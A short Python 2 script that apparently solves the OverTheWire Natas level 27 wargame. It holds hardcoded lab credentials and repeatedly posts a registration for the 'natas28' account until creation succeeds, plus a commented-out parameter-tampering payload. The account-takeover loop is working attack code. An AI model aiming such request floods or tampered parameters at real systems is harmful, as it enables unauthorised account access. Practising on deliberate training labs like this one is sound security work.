import requests
import time
import re

user_auth = ('natas27','55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

#target = 'http://natas27.natas.labs.overthewire.org/index.php'
target = 'http://natas27.natas.labs.overthewire.org/index.php'

# create a user legitimately 
#payload = {'username[0]':'hi','password[0]':'hi',
#    'username[1]':'natas28','password[1]':'lol'}
payload = {'username':'natas28', 'password':'hi'}

begin = time.time()

while time.time() - begin < 300 : 
    response = requests.post(target, auth = user_auth, data = payload)
    
    #print response.text
    print time.time() - begin
    match = re.search('created', response.text)
    if match != None :
        print '-'*80
        break

response = requests.post(target, auth = user_auth, data = payload)
response = requests.post(target, auth = user_auth, data = payload)
response = requests.post(target, auth = user_auth, data = payload)
print response.text
